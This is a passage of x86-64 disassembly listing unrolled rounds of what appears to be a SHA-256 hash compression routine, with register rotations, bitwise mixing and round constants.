    6d8c62b1:	41 c1 c8 0d          	ror    $0xd,%r8d
    6d8c62b5:	45 31 c8             	xor    %r9d,%r8d
    6d8c62b8:	45 89 d1             	mov    %r10d,%r9d
    6d8c62bb:	41 c1 c1 0a          	rol    $0xa,%r9d
    6d8c62bf:	45 31 c8             	xor    %r9d,%r8d
    6d8c62c2:	41 89 d1             	mov    %edx,%r9d
    6d8c62c5:	41 31 c1             	xor    %eax,%r9d
    6d8c62c8:	45 21 d1             	and    %r10d,%r9d
    6d8c62cb:	45 31 f9             	xor    %r15d,%r9d
    6d8c62ce:	41 89 c7             	mov    %eax,%r15d
    6d8c62d1:	45 01 c1             	add    %r8d,%r9d
    6d8c62d4:	45 89 e8             	mov    %r13d,%r8d
    6d8c62d7:	45 01 f1             	add    %r14d,%r9d
    6d8c62da:	45 89 ee             	mov    %r13d,%r14d
    6d8c62dd:	41 c1 c8 06          	ror    $0x6,%r8d
    6d8c62e1:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c62e5:	45 31 f0             	xor    %r14d,%r8d
    6d8c62e8:	45 89 ee             	mov    %r13d,%r14d
    6d8c62eb:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c62ef:	45 21 d7             	and    %r10d,%r15d
    6d8c62f2:	45 31 c6             	xor    %r8d,%r14d
    6d8c62f5:	44 8b 44 24 24       	mov    0x24(%rsp),%r8d
    6d8c62fa:	47 8d a4 04 01 5b 83 	lea    0x12835b01(%r12,%r8,1),%r12d
    6d8c6301:	12 
    6d8c6302:	45 89 e8             	mov    %r13d,%r8d
    6d8c6305:	45 01 f4             	add    %r14d,%r12d
    6d8c6308:	41 f7 d0             	not    %r8d
    6d8c630b:	41 89 fe             	mov    %edi,%r14d
    6d8c630e:	41 21 e8             	and    %ebp,%r8d
    6d8c6311:	45 21 ee             	and    %r13d,%r14d
    6d8c6314:	45 31 c6             	xor    %r8d,%r14d
    6d8c6317:	45 89 c8             	mov    %r9d,%r8d
    6d8c631a:	45 01 e6             	add    %r12d,%r14d
    6d8c631d:	41 c1 c8 02          	ror    $0x2,%r8d
    6d8c6321:	46 8d 24 32          	lea    (%rdx,%r14,1),%r12d
    6d8c6325:	44 89 ca             	mov    %r9d,%edx
    6d8c6328:	c1 ca 0d             	ror    $0xd,%edx
    6d8c632b:	44 31 c2             	xor    %r8d,%edx
    6d8c632e:	45 89 c8             	mov    %r9d,%r8d
    6d8c6331:	41 c1 c0 0a          	rol    $0xa,%r8d
    6d8c6335:	44 31 c2             	xor    %r8d,%edx
    6d8c6338:	41 89 c0             	mov    %eax,%r8d
    6d8c633b:	45 31 d0             	xor    %r10d,%r8d
    6d8c633e:	45 21 c8             	and    %r9d,%r8d
    6d8c6341:	45 31 f8             	xor    %r15d,%r8d
    6d8c6344:	45 89 d7             	mov    %r10d,%r15d
    6d8c6347:	41 01 d0             	add    %edx,%r8d
    6d8c634a:	44 89 e2             	mov    %r12d,%edx
    6d8c634d:	45 01 f0             	add    %r14d,%r8d
    6d8c6350:	45 89 e6             	mov    %r12d,%r14d
    6d8c6353:	c1 ca 06             	ror    $0x6,%edx
    6d8c6356:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c635a:	44 31 f2             	xor    %r14d,%edx
    6d8c635d:	45 89 e6             	mov    %r12d,%r14d
    6d8c6360:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6364:	41 31 d6             	xor    %edx,%r14d
    6d8c6367:	8b 54 24 28          	mov    0x28(%rsp),%edx
    6d8c636b:	8d ac 15 be 85 31 24 	lea    0x243185be(%rbp,%rdx,1),%ebp
    6d8c6372:	44 89 e2             	mov    %r12d,%edx
    6d8c6375:	44 01 f5             	add    %r14d,%ebp
    6d8c6378:	f7 d2                	not    %edx
    6d8c637a:	45 89 ee             	mov    %r13d,%r14d
    6d8c637d:	21 fa                	and    %edi,%edx
    6d8c637f:	45 21 e6             	and    %r12d,%r14d
    6d8c6382:	41 31 d6             	xor    %edx,%r14d
    6d8c6385:	44 89 c2             	mov    %r8d,%edx
    6d8c6388:	41 01 ee             	add    %ebp,%r14d
    6d8c638b:	c1 ca 02             	ror    $0x2,%edx
    6d8c638e:	42 8d 2c 30          	lea    (%rax,%r14,1),%ebp
    6d8c6392:	44 89 c0             	mov    %r8d,%eax
    6d8c6395:	c1 c8 0d             	ror    $0xd,%eax
    6d8c6398:	31 d0                	xor    %edx,%eax
    6d8c639a:	44 89 c2             	mov    %r8d,%edx
    6d8c639d:	c1 c2 0a             	rol    $0xa,%edx
    6d8c63a0:	31 d0                	xor    %edx,%eax
    6d8c63a2:	44 89 d2             	mov    %r10d,%edx
    6d8c63a5:	45 21 cf             	and    %r9d,%r15d
    6d8c63a8:	44 31 ca             	xor    %r9d,%edx
    6d8c63ab:	44 21 c2             	and    %r8d,%edx
    6d8c63ae:	44 31 fa             	xor    %r15d,%edx
    6d8c63b1:	45 89 cf             	mov    %r9d,%r15d
    6d8c63b4:	01 c2                	add    %eax,%edx
    6d8c63b6:	89 e8                	mov    %ebp,%eax
    6d8c63b8:	45 21 c7             	and    %r8d,%r15d
    6d8c63bb:	44 01 f2             	add    %r14d,%edx
    6d8c63be:	41 89 ee             	mov    %ebp,%r14d
    6d8c63c1:	c1 c8 06             	ror    $0x6,%eax
    6d8c63c4:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c63c8:	44 31 f0             	xor    %r14d,%eax
    6d8c63cb:	41 89 ee             	mov    %ebp,%r14d
    6d8c63ce:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c63d2:	41 31 c6             	xor    %eax,%r14d
    6d8c63d5:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
    6d8c63d9:	8d bc 07 c3 7d 0c 55 	lea    0x550c7dc3(%rdi,%rax,1),%edi
    6d8c63e0:	89 e8                	mov    %ebp,%eax
    6d8c63e2:	44 01 f7             	add    %r14d,%edi
    6d8c63e5:	f7 d0                	not    %eax
    6d8c63e7:	45 89 e6             	mov    %r12d,%r14d
    6d8c63ea:	44 21 e8             	and    %r13d,%eax
    6d8c63ed:	41 21 ee             	and    %ebp,%r14d
    6d8c63f0:	41 31 c6             	xor    %eax,%r14d
    6d8c63f3:	89 d0                	mov    %edx,%eax
    6d8c63f5:	41 01 fe             	add    %edi,%r14d
    6d8c63f8:	c1 c8 02             	ror    $0x2,%eax
    6d8c63fb:	43 8d 3c 32          	lea    (%r10,%r14,1),%edi
    6d8c63ff:	41 89 d2             	mov    %edx,%r10d
    6d8c6402:	41 c1 ca 0d          	ror    $0xd,%r10d
    6d8c6406:	41 31 c2             	xor    %eax,%r10d
    6d8c6409:	89 d0                	mov    %edx,%eax
    6d8c640b:	c1 c0 0a             	rol    $0xa,%eax
    6d8c640e:	41 31 c2             	xor    %eax,%r10d
    6d8c6411:	44 89 c8             	mov    %r9d,%eax
    6d8c6414:	44 31 c0             	xor    %r8d,%eax
    6d8c6417:	21 d0                	and    %edx,%eax
    6d8c6419:	44 31 f8             	xor    %r15d,%eax
    6d8c641c:	45 89 c7             	mov    %r8d,%r15d
    6d8c641f:	44 01 d0             	add    %r10d,%eax
    6d8c6422:	41 89 fa             	mov    %edi,%r10d
    6d8c6425:	44 01 f0             	add    %r14d,%eax
    6d8c6428:	41 89 fe             	mov    %edi,%r14d
    6d8c642b:	41 c1 ca 06          	ror    $0x6,%r10d
    6d8c642f:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6433:	45 31 f2             	xor    %r14d,%r10d
    6d8c6436:	41 89 fe             	mov    %edi,%r14d
    6d8c6439:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c643d:	45 31 d6             	xor    %r10d,%r14d
    6d8c6440:	44 8b 54 24 30       	mov    0x30(%rsp),%r10d
    6d8c6445:	41 21 d7             	and    %edx,%r15d
    6d8c6448:	47 8d ac 15 74 5d be 	lea    0x72be5d74(%r13,%r10,1),%r13d
    6d8c644f:	72 
    6d8c6450:	41 89 fa             	mov    %edi,%r10d
    6d8c6453:	45 01 f5             	add    %r14d,%r13d
    6d8c6456:	41 f7 d2             	not    %r10d
    6d8c6459:	41 89 ee             	mov    %ebp,%r14d
    6d8c645c:	45 21 e2             	and    %r12d,%r10d
    6d8c645f:	41 21 fe             	and    %edi,%r14d
    6d8c6462:	45 31 d6             	xor    %r10d,%r14d
    6d8c6465:	41 89 c2             	mov    %eax,%r10d
    6d8c6468:	45 01 ee             	add    %r13d,%r14d
    6d8c646b:	41 c1 ca 02          	ror    $0x2,%r10d
    6d8c646f:	47 8d 2c 31          	lea    (%r9,%r14,1),%r13d
    6d8c6473:	41 89 c1             	mov    %eax,%r9d
    6d8c6476:	41 c1 c9 0d          	ror    $0xd,%r9d
    6d8c647a:	45 31 d1             	xor    %r10d,%r9d
    6d8c647d:	41 89 c2             	mov    %eax,%r10d
    6d8c6480:	41 c1 c2 0a          	rol    $0xa,%r10d
    6d8c6484:	45 31 d1             	xor    %r10d,%r9d
    6d8c6487:	45 89 c2             	mov    %r8d,%r10d
    6d8c648a:	41 31 d2             	xor    %edx,%r10d
    6d8c648d:	41 21 c2             	and    %eax,%r10d
    6d8c6490:	45 31 fa             	xor    %r15d,%r10d
    6d8c6493:	41 89 d7             	mov    %edx,%r15d
    6d8c6496:	45 01 ca             	add    %r9d,%r10d
    6d8c6499:	45 89 e9             	mov    %r13d,%r9d
    6d8c649c:	45 01 f2             	add    %r14d,%r10d
    6d8c649f:	45 89 ee             	mov    %r13d,%r14d
    6d8c64a2:	41 c1 c9 06          	ror    $0x6,%r9d
    6d8c64a6:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c64aa:	45 31 f1             	xor    %r14d,%r9d
    6d8c64ad:	45 89 ee             	mov    %r13d,%r14d
    6d8c64b0:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c64b4:	45 31 ce             	xor    %r9d,%r14d
    6d8c64b7:	44 8b 4c 24 34       	mov    0x34(%rsp),%r9d
    6d8c64bc:	47 8d a4 0c fe b1 de 	lea    -0x7f214e02(%r12,%r9,1),%r12d
    6d8c64c3:	80 
    6d8c64c4:	45 89 e9             	mov    %r13d,%r9d
    6d8c64c7:	45 01 f4             	add    %r14d,%r12d
    6d8c64ca:	41 f7 d1             	not    %r9d
    6d8c64cd:	41 89 fe             	mov    %edi,%r14d
    6d8c64d0:	41 21 e9             	and    %ebp,%r9d
    6d8c64d3:	45 21 ee             	and    %r13d,%r14d
    6d8c64d6:	45 31 ce             	xor    %r9d,%r14d
    6d8c64d9:	45 89 d1             	mov    %r10d,%r9d
    6d8c64dc:	45 01 e6             	add    %r12d,%r14d
    6d8c64df:	41 c1 c9 02          	ror    $0x2,%r9d
    6d8c64e3:	47 8d 24 30          	lea    (%r8,%r14,1),%r12d
    6d8c64e7:	45 89 d0             	mov    %r10d,%r8d
    6d8c64ea:	41 c1 c8 0d          	ror    $0xd,%r8d
    6d8c64ee:	45 31 c8             	xor    %r9d,%r8d
    6d8c64f1:	45 89 d1             	mov    %r10d,%r9d
    6d8c64f4:	41 c1 c1 0a          	rol    $0xa,%r9d
    6d8c64f8:	45 31 c8             	xor    %r9d,%r8d
    6d8c64fb:	41 89 d1             	mov    %edx,%r9d
    6d8c64fe:	41 31 c1             	xor    %eax,%r9d
    6d8c6501:	41 21 c7             	and    %eax,%r15d
    6d8c6504:	45 21 d1             	and    %r10d,%r9d
    6d8c6507:	45 31 f9             	xor    %r15d,%r9d
    6d8c650a:	41 89 c7             	mov    %eax,%r15d
    6d8c650d:	45 01 c1             	add    %r8d,%r9d
    6d8c6510:	45 89 e0             	mov    %r12d,%r8d
    6d8c6513:	45 21 d7             	and    %r10d,%r15d
    6d8c6516:	45 01 f1             	add    %r14d,%r9d
    6d8c6519:	45 89 e6             	mov    %r12d,%r14d
    6d8c651c:	41 c1 c8 06          	ror    $0x6,%r8d
    6d8c6520:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6524:	45 31 f0             	xor    %r14d,%r8d
    6d8c6527:	45 89 e6             	mov    %r12d,%r14d
    6d8c652a:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c652e:	45 31 c6             	xor    %r8d,%r14d
    6d8c6531:	44 8b 44 24 38       	mov    0x38(%rsp),%r8d
    6d8c6536:	42 8d ac 05 a7 06 dc 	lea    -0x6423f959(%rbp,%r8,1),%ebp
    6d8c653d:	9b 
    6d8c653e:	45 89 e0             	mov    %r12d,%r8d
    6d8c6541:	44 01 f5             	add    %r14d,%ebp
    6d8c6544:	41 f7 d0             	not    %r8d
    6d8c6547:	45 89 ee             	mov    %r13d,%r14d
    6d8c654a:	41 21 f8             	and    %edi,%r8d
    6d8c654d:	45 21 e6             	and    %r12d,%r14d
    6d8c6550:	45 31 c6             	xor    %r8d,%r14d
    6d8c6553:	45 89 c8             	mov    %r9d,%r8d
    6d8c6556:	41 01 ee             	add    %ebp,%r14d
    6d8c6559:	41 c1 c8 02          	ror    $0x2,%r8d
    6d8c655d:	42 8d 2c 32          	lea    (%rdx,%r14,1),%ebp
    6d8c6561:	44 89 ca             	mov    %r9d,%edx
    6d8c6564:	c1 ca 0d             	ror    $0xd,%edx
    6d8c6567:	44 31 c2             	xor    %r8d,%edx
    6d8c656a:	45 89 c8             	mov    %r9d,%r8d
    6d8c656d:	41 c1 c0 0a          	rol    $0xa,%r8d
    6d8c6571:	44 31 c2             	xor    %r8d,%edx
    6d8c6574:	41 89 c0             	mov    %eax,%r8d
    6d8c6577:	45 31 d0             	xor    %r10d,%r8d
    6d8c657a:	45 21 c8             	and    %r9d,%r8d
    6d8c657d:	45 31 f8             	xor    %r15d,%r8d
    6d8c6580:	45 89 d7             	mov    %r10d,%r15d
    6d8c6583:	41 01 d0             	add    %edx,%r8d
    6d8c6586:	89 ea                	mov    %ebp,%edx
    6d8c6588:	45 01 f0             	add    %r14d,%r8d
    6d8c658b:	41 89 ee             	mov    %ebp,%r14d
    6d8c658e:	c1 ca 06             	ror    $0x6,%edx
    6d8c6591:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6595:	44 31 f2             	xor    %r14d,%edx
    6d8c6598:	41 89 ee             	mov    %ebp,%r14d
    6d8c659b:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c659f:	41 31 d6             	xor    %edx,%r14d
    6d8c65a2:	8b 54 24 3c          	mov    0x3c(%rsp),%edx
    6d8c65a6:	8d bc 17 74 f1 9b c1 	lea    -0x3e640e8c(%rdi,%rdx,1),%edi
    6d8c65ad:	89 ea                	mov    %ebp,%edx
    6d8c65af:	44 01 f7             	add    %r14d,%edi
    6d8c65b2:	f7 d2                	not    %edx
    6d8c65b4:	45 89 e6             	mov    %r12d,%r14d
    6d8c65b7:	44 21 ea             	and    %r13d,%edx
    6d8c65ba:	41 21 ee             	and    %ebp,%r14d
    6d8c65bd:	45 21 cf             	and    %r9d,%r15d
    6d8c65c0:	41 31 d6             	xor    %edx,%r14d
    6d8c65c3:	44 89 c2             	mov    %r8d,%edx
    6d8c65c6:	41 01 fe             	add    %edi,%r14d
    6d8c65c9:	c1 ca 02             	ror    $0x2,%edx
    6d8c65cc:	42 8d 3c 30          	lea    (%rax,%r14,1),%edi
    6d8c65d0:	44 89 c0             	mov    %r8d,%eax
    6d8c65d3:	c1 c8 0d             	ror    $0xd,%eax
    6d8c65d6:	31 d0                	xor    %edx,%eax
    6d8c65d8:	44 89 c2             	mov    %r8d,%edx
    6d8c65db:	c1 c2 0a             	rol    $0xa,%edx
    6d8c65de:	31 d0                	xor    %edx,%eax
    6d8c65e0:	44 89 d2             	mov    %r10d,%edx
    6d8c65e3:	44 31 ca             	xor    %r9d,%edx
    6d8c65e6:	44 21 c2             	and    %r8d,%edx
    6d8c65e9:	44 31 fa             	xor    %r15d,%edx
    6d8c65ec:	45 89 cf             	mov    %r9d,%r15d
    6d8c65ef:	01 c2                	add    %eax,%edx
    6d8c65f1:	89 f8                	mov    %edi,%eax
    6d8c65f3:	44 01 f2             	add    %r14d,%edx
    6d8c65f6:	41 89 fe             	mov    %edi,%r14d
    6d8c65f9:	c1 c8 06             	ror    $0x6,%eax
    6d8c65fc:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6600:	44 31 f0             	xor    %r14d,%eax
    6d8c6603:	41 89 fe             	mov    %edi,%r14d
    6d8c6606:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c660a:	41 31 c6             	xor    %eax,%r14d
    6d8c660d:	8b 44 24 40          	mov    0x40(%rsp),%eax
    6d8c6611:	45 8d ac 05 c1 69 9b 	lea    -0x1b64963f(%r13,%rax,1),%r13d
    6d8c6618:	e4 
    6d8c6619:	89 f8                	mov    %edi,%eax
    6d8c661b:	45 01 f5             	add    %r14d,%r13d
    6d8c661e:	f7 d0                	not    %eax
    6d8c6620:	41 89 ee             	mov    %ebp,%r14d
    6d8c6623:	44 21 e0             	and    %r12d,%eax
    6d8c6626:	41 21 fe             	and    %edi,%r14d
    6d8c6629:	41 31 c6             	xor    %eax,%r14d
    6d8c662c:	89 d0                	mov    %edx,%eax
    6d8c662e:	45 01 ee             	add    %r13d,%r14d
    6d8c6631:	c1 c8 02             	ror    $0x2,%eax
    6d8c6634:	47 8d 2c 32          	lea    (%r10,%r14,1),%r13d
    6d8c6638:	41 89 d2             	mov    %edx,%r10d
    6d8c663b:	41 c1 ca 0d          	ror    $0xd,%r10d
    6d8c663f:	41 31 c2             	xor    %eax,%r10d
    6d8c6642:	89 d0                	mov    %edx,%eax
    6d8c6644:	c1 c0 0a             	rol    $0xa,%eax
    6d8c6647:	41 31 c2             	xor    %eax,%r10d
    6d8c664a:	44 89 c8             	mov    %r9d,%eax
    6d8c664d:	44 31 c0             	xor    %r8d,%eax
    6d8c6650:	21 d0                	and    %edx,%eax
    6d8c6652:	45 21 c7             	and    %r8d,%r15d
    6d8c6655:	44 31 f8             	xor    %r15d,%eax
    6d8c6658:	45 89 c7             	mov    %r8d,%r15d
    6d8c665b:	44 01 d0             	add    %r10d,%eax
    6d8c665e:	45 89 ea             	mov    %r13d,%r10d
    6d8c6661:	41 21 d7             	and    %edx,%r15d
    6d8c6664:	44 01 f0             	add    %r14d,%eax
    6d8c6667:	45 89 ee             	mov    %r13d,%r14d
    6d8c666a:	41 c1 ca 06          	ror    $0x6,%r10d
    6d8c666e:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6672:	45 31 f2             	xor    %r14d,%r10d
    6d8c6675:	45 89 ee             	mov    %r13d,%r14d
    6d8c6678:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c667c:	45 31 d6             	xor    %r10d,%r14d
    6d8c667f:	44 8b 54 24 44       	mov    0x44(%rsp),%r10d
    6d8c6684:	47 8d a4 14 86 47 be 	lea    -0x1041b87a(%r12,%r10,1),%r12d
    6d8c668b:	ef 
    6d8c668c:	45 89 ea             	mov    %r13d,%r10d
    6d8c668f:	45 01 f4             	add    %r14d,%r12d
    6d8c6692:	41 f7 d2             	not    %r10d
    6d8c6695:	41 89 fe             	mov    %edi,%r14d
    6d8c6698:	41 21 ea             	and    %ebp,%r10d
    6d8c669b:	45 21 ee             	and    %r13d,%r14d
    6d8c669e:	45 31 d6             	xor    %r10d,%r14d
    6d8c66a1:	41 89 c2             	mov    %eax,%r10d
    6d8c66a4:	45 01 e6             	add    %r12d,%r14d
    6d8c66a7:	41 c1 ca 02          	ror    $0x2,%r10d
    6d8c66ab:	47 8d 24 31          	lea    (%r9,%r14,1),%r12d
    6d8c66af:	41 89 c1             	mov    %eax,%r9d
    6d8c66b2:	41 c1 c9 0d          	ror    $0xd,%r9d
    6d8c66b6:	45 31 d1             	xor    %r10d,%r9d
    6d8c66b9:	41 89 c2             	mov    %eax,%r10d
    6d8c66bc:	41 c1 c2 0a          	rol    $0xa,%r10d
    6d8c66c0:	45 31 d1             	xor    %r10d,%r9d
    6d8c66c3:	45 89 c2             	mov    %r8d,%r10d
    6d8c66c6:	41 31 d2             	xor    %edx,%r10d
    6d8c66c9:	41 21 c2             	and    %eax,%r10d
    6d8c66cc:	45 31 fa             	xor    %r15d,%r10d
    6d8c66cf:	41 89 d7             	mov    %edx,%r15d
    6d8c66d2:	45 01 ca             	add    %r9d,%r10d
    6d8c66d5:	45 89 e1             	mov    %r12d,%r9d
    6d8c66d8:	45 01 f2             	add    %r14d,%r10d
    6d8c66db:	45 89 e6             	mov    %r12d,%r14d
    6d8c66de:	41 c1 c9 06          	ror    $0x6,%r9d
    6d8c66e2:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c66e6:	45 31 f1             	xor    %r14d,%r9d
    6d8c66e9:	45 89 e6             	mov    %r12d,%r14d
    6d8c66ec:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c66f0:	45 31 ce             	xor    %r9d,%r14d
    6d8c66f3:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
    6d8c66f8:	42 8d ac 0d c6 9d c1 	lea    0xfc19dc6(%rbp,%r9,1),%ebp
    6d8c66ff:	0f 
    6d8c6700:	45 89 e1             	mov    %r12d,%r9d
    6d8c6703:	44 01 f5             	add    %r14d,%ebp
    6d8c6706:	41 f7 d1             	not    %r9d
    6d8c6709:	45 89 ee             	mov    %r13d,%r14d
    6d8c670c:	41 21 f9             	and    %edi,%r9d
    6d8c670f:	45 21 e6             	and    %r12d,%r14d
    6d8c6712:	41 21 c7             	and    %eax,%r15d
    6d8c6715:	45 31 ce             	xor    %r9d,%r14d
    6d8c6718:	45 89 d1             	mov    %r10d,%r9d
    6d8c671b:	41 01 ee             	add    %ebp,%r14d
    6d8c671e:	41 c1 c9 02          	ror    $0x2,%r9d
    6d8c6722:	43 8d 2c 30          	lea    (%r8,%r14,1),%ebp
    6d8c6726:	45 89 d0             	mov    %r10d,%r8d
    6d8c6729:	41 c1 c8 0d          	ror    $0xd,%r8d
    6d8c672d:	45 31 c8             	xor    %r9d,%r8d
    6d8c6730:	45 89 d1             	mov    %r10d,%r9d
    6d8c6733:	41 c1 c1 0a          	rol    $0xa,%r9d
    6d8c6737:	45 31 c8             	xor    %r9d,%r8d
    6d8c673a:	41 89 d1             	mov    %edx,%r9d
    6d8c673d:	41 31 c1             	xor    %eax,%r9d
    6d8c6740:	45 21 d1             	and    %r10d,%r9d
    6d8c6743:	45 31 f9             	xor    %r15d,%r9d
    6d8c6746:	41 89 c7             	mov    %eax,%r15d
    6d8c6749:	45 01 c1             	add    %r8d,%r9d
    6d8c674c:	41 89 e8             	mov    %ebp,%r8d
    6d8c674f:	45 01 f1             	add    %r14d,%r9d
    6d8c6752:	41 89 ee             	mov    %ebp,%r14d
    6d8c6755:	41 c1 c8 06          	ror    $0x6,%r8d
    6d8c6759:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c675d:	45 31 f0             	xor    %r14d,%r8d
    6d8c6760:	41 89 ee             	mov    %ebp,%r14d
    6d8c6763:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6767:	45 31 c6             	xor    %r8d,%r14d
    6d8c676a:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
    6d8c676f:	42 8d bc 07 cc a1 0c 	lea    0x240ca1cc(%rdi,%r8,1),%edi
    6d8c6776:	24 
    6d8c6777:	41 89 e8             	mov    %ebp,%r8d
    6d8c677a:	44 01 f7             	add    %r14d,%edi
    6d8c677d:	41 f7 d0             	not    %r8d
    6d8c6780:	45 89 e6             	mov    %r12d,%r14d
    6d8c6783:	45 21 e8             	and    %r13d,%r8d
    6d8c6786:	41 21 ee             	and    %ebp,%r14d
    6d8c6789:	45 31 c6             	xor    %r8d,%r14d
    6d8c678c:	45 89 c8             	mov    %r9d,%r8d
    6d8c678f:	41 01 fe             	add    %edi,%r14d
    6d8c6792:	41 c1 c8 02          	ror    $0x2,%r8d
    6d8c6796:	42 8d 3c 32          	lea    (%rdx,%r14,1),%edi
    6d8c679a:	44 89 ca             	mov    %r9d,%edx
    6d8c679d:	c1 ca 0d             	ror    $0xd,%edx
    6d8c67a0:	44 31 c2             	xor    %r8d,%edx
    6d8c67a3:	45 89 c8             	mov    %r9d,%r8d
    6d8c67a6:	41 c1 c0 0a          	rol    $0xa,%r8d
    6d8c67aa:	44 31 c2             	xor    %r8d,%edx
    6d8c67ad:	41 89 c0             	mov    %eax,%r8d
    6d8c67b0:	45 31 d0             	xor    %r10d,%r8d
    6d8c67b3:	45 21 c8             	and    %r9d,%r8d
    6d8c67b6:	45 21 d7             	and    %r10d,%r15d
    6d8c67b9:	45 31 f8             	xor    %r15d,%r8d
    6d8c67bc:	45 89 d7             	mov    %r10d,%r15d
    6d8c67bf:	41 01 d0             	add    %edx,%r8d
    6d8c67c2:	89 fa                	mov    %edi,%edx
    6d8c67c4:	45 21 cf             	and    %r9d,%r15d
    6d8c67c7:	45 01 f0             	add    %r14d,%r8d
    6d8c67ca:	41 89 fe             	mov    %edi,%r14d
    6d8c67cd:	c1 ca 06             	ror    $0x6,%edx
    6d8c67d0:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c67d4:	44 31 f2             	xor    %r14d,%edx
    6d8c67d7:	41 89 fe             	mov    %edi,%r14d
    6d8c67da:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c67de:	41 31 d6             	xor    %edx,%r14d
    6d8c67e1:	8b 54 24 50          	mov    0x50(%rsp),%edx
    6d8c67e5:	45 8d ac 15 6f 2c e9 	lea    0x2de92c6f(%r13,%rdx,1),%r13d
    6d8c67ec:	2d 
    6d8c67ed:	89 fa                	mov    %edi,%edx
    6d8c67ef:	45 01 f5             	add    %r14d,%r13d
    6d8c67f2:	f7 d2                	not    %edx
    6d8c67f4:	41 89 ee             	mov    %ebp,%r14d
    6d8c67f7:	44 21 e2             	and    %r12d,%edx
    6d8c67fa:	41 21 fe             	and    %edi,%r14d
    6d8c67fd:	41 31 d6             	xor    %edx,%r14d
    6d8c6800:	44 89 c2             	mov    %r8d,%edx
    6d8c6803:	45 01 ee             	add    %r13d,%r14d
    6d8c6806:	c1 ca 02             	ror    $0x2,%edx
    6d8c6809:	46 8d 2c 30          	lea    (%rax,%r14,1),%r13d
    6d8c680d:	44 89 c0             	mov    %r8d,%eax
    6d8c6810:	c1 c8 0d             	ror    $0xd,%eax
    6d8c6813:	31 d0                	xor    %edx,%eax
    6d8c6815:	44 89 c2             	mov    %r8d,%edx
    6d8c6818:	c1 c2 0a             	rol    $0xa,%edx
    6d8c681b:	31 d0                	xor    %edx,%eax
    6d8c681d:	44 89 d2             	mov    %r10d,%edx
    6d8c6820:	44 31 ca             	xor    %r9d,%edx
    6d8c6823:	44 21 c2             	and    %r8d,%edx
    6d8c6826:	44 31 fa             	xor    %r15d,%edx
    6d8c6829:	45 89 cf             	mov    %r9d,%r15d
    6d8c682c:	01 c2                	add    %eax,%edx
    6d8c682e:	44 89 e8             	mov    %r13d,%eax
    6d8c6831:	44 01 f2             	add    %r14d,%edx
    6d8c6834:	45 89 ee             	mov    %r13d,%r14d
    6d8c6837:	c1 c8 06             	ror    $0x6,%eax
    6d8c683a:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c683e:	44 31 f0             	xor    %r14d,%eax
    6d8c6841:	45 89 ee             	mov    %r13d,%r14d
    6d8c6844:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6848:	41 31 c6             	xor    %eax,%r14d
    6d8c684b:	8b 44 24 54          	mov    0x54(%rsp),%eax
    6d8c684f:	45 8d a4 04 aa 84 74 	lea    0x4a7484aa(%r12,%rax,1),%r12d
    6d8c6856:	4a 
    6d8c6857:	44 89 e8             	mov    %r13d,%eax
    6d8c685a:	45 01 f4             	add    %r14d,%r12d
    6d8c685d:	f7 d0                	not    %eax
    6d8c685f:	41 89 fe             	mov    %edi,%r14d
    6d8c6862:	21 e8                	and    %ebp,%eax
    6d8c6864:	45 21 ee             	and    %r13d,%r14d
    6d8c6867:	45 21 c7             	and    %r8d,%r15d
    6d8c686a:	41 31 c6             	xor    %eax,%r14d
    6d8c686d:	89 d0                	mov    %edx,%eax
    6d8c686f:	45 01 e6             	add    %r12d,%r14d
    6d8c6872:	c1 c8 02             	ror    $0x2,%eax
    6d8c6875:	47 8d 24 32          	lea    (%r10,%r14,1),%r12d
    6d8c6879:	41 89 d2             	mov    %edx,%r10d
    6d8c687c:	41 c1 ca 0d          	ror    $0xd,%r10d
    6d8c6880:	41 31 c2             	xor    %eax,%r10d
    6d8c6883:	89 d0                	mov    %edx,%eax
    6d8c6885:	c1 c0 0a             	rol    $0xa,%eax
    6d8c6888:	41 31 c2             	xor    %eax,%r10d
    6d8c688b:	44 89 c8             	mov    %r9d,%eax
    6d8c688e:	44 31 c0             	xor    %r8d,%eax
    6d8c6891:	21 d0                	and    %edx,%eax
    6d8c6893:	44 31 f8             	xor    %r15d,%eax
    6d8c6896:	45 89 c7             	mov    %r8d,%r15d
    6d8c6899:	44 01 d0             	add    %r10d,%eax
    6d8c689c:	45 89 e2             	mov    %r12d,%r10d
    6d8c689f:	41 21 d7             	and    %edx,%r15d
    6d8c68a2:	44 01 f0             	add    %r14d,%eax
    6d8c68a5:	45 89 e6             	mov    %r12d,%r14d
    6d8c68a8:	41 c1 ca 06          	ror    $0x6,%r10d
    6d8c68ac:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c68b0:	45 31 f2             	xor    %r14d,%r10d
    6d8c68b3:	45 89 e6             	mov    %r12d,%r14d
    6d8c68b6:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c68ba:	45 31 d6             	xor    %r10d,%r14d
    6d8c68bd:	44 8b 54 24 58       	mov    0x58(%rsp),%r10d
    6d8c68c2:	42 8d ac 15 dc a9 b0 	lea    0x5cb0a9dc(%rbp,%r10,1),%ebp
    6d8c68c9:	5c 
